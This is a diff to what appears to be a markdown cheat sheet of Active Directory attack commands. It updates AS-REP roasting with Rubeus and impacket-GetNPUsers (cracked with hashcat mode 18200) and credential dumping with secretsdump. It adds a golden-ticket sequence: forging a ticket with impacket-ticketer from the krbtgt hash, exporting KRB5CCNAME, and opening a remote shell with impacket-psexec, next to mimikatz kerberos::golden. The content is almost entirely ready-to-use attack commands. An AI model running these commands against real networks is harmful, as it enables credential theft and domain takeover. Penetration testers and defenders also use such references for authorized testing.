@@ -58,7 +58,9 @@ Rubeus.exe asreproast
 
 # Impacket's GetNPUsers.py
 # Enumerate the users > user.txt
-GetNPUsers.py DOMAIN/ -usersfile user.txt -format hashcat -outputfile hash.asreproast
+impacket-GetNPUsers DOMAIN/ -usersfile user.txt [-format hashcat] [-outputfile hash]
+impacket-GetNPUsers DOMAIN/USER -no-pass -dc-ip IP [-format hashcat]
+impacket-GetNPUsers -dc-ip IP -request DOMAIN/
 # hashcat -m 18200
 
 secretsdump.py USER@DOMAIN-IP
@@ -105,6 +107,12 @@ kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM
 
 # open a new elevated command prompt with the given ticket in mimikatz.
 misc::cmd
+```
+
+```bash
+impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid DOMAIN_SID -domain FQDN_DOMAIN USER
+export KRB5CCNAME=FILE.cache
+impacket-psexec DOMAIN/USER@DOMAIN -k -no-pass
 ```
 
 #### Silver Ticket
